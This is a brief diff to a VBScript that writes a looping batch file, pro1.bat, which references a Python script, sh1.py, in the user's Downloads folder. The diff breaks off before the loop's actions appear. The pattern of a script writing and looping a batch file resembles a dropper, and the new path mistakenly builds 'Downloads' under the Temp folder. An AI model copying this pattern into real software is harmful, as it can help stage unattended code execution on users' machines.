@@ -1,5 +1,8 @@
+'Set objFSO = CreateObject("Scripting.FileSystemObject")
+'Set objFile = objFSO.CreateTextFile("pro1.bat")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objFile = objFSO.CreateTextFile("pro1.bat")
+downloadsDir = objFSO.BuildPath(objFSO.GetSpecialFolder(2).Path, "Downloads")
+Set objFile = objFSO.CreateTextFile(objFSO.BuildPath(downloadsDir, "pro1.bat"))
 objFile.WriteLine "@echo off"
 objFile.WriteLine ":loop"
 objFile.WriteLine "set FILE=%USERPROFILE%\Downloads\sh1.py"
